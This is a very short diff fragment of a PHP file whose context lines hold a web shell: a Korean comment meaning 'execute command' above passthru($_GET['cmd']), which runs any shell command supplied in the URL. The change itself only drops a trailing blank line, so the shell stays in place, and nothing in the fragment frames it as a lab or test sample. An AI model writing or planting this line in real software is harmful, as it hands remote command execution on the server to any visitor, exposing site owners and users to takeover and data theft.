@@ -7,4 +7,3 @@
     // 명령어 실행
     passthru($_GET['cmd']);
 ?>
-
